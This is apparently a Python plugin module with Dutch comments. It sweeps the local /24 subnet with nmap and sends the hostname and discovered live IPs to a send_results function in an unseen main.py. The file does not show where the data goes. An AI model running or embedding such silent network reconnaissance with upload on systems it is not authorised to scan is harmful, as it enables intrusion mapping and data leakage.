import socket
import subprocess

def run():
    try:
        # Verkrijg het hostname en netwerkbereik
        hostname = socket.gethostname()
        ip_base = ".".join(socket.gethostbyname(socket.gethostname()).split(".")[:3]) + ".0/24"

        print(f"Netwerk scannen: {ip_base}")
        
        # Gebruik nmap om een ARP-scan uit te voeren
        result = subprocess.check_output(["nmap", "-sn", ip_base], universal_newlines=True)

        # Verwerk de nmap-uitvoer om alleen IP-adressen te extraheren
        ip_addresses = []
        for line in result.splitlines():
            if "Nmap scan report for" in line:
                ip = line.split(" ")[-1]
                ip_addresses.append(ip)

        # Check of er IP-adressen zijn gevonden
        if not ip_addresses:
            print("Geen actieve IP-adressen gevonden.")
            return {"status": "no_ips_found"}

        print(f"Gevonden IP-adressen: {ip_addresses}")

        # Voorbereiden van de data om te uploaden
        results = {
            "hostname": hostname,
            "ips": ip_addresses
        }

        # Upload resultaten met behulp van de `send_results`-functie uit main.py
        from main import send_results  # Importeer dynamisch om naamconflicten te vermijden
        send_results(results)

        return {"status": "success", "found_ips": ip_addresses}

    except Exception as e:
        print(f"Fout tijdens netwerkverkenning: {e}")
        return {"status": "error", "error_message": str(e)}
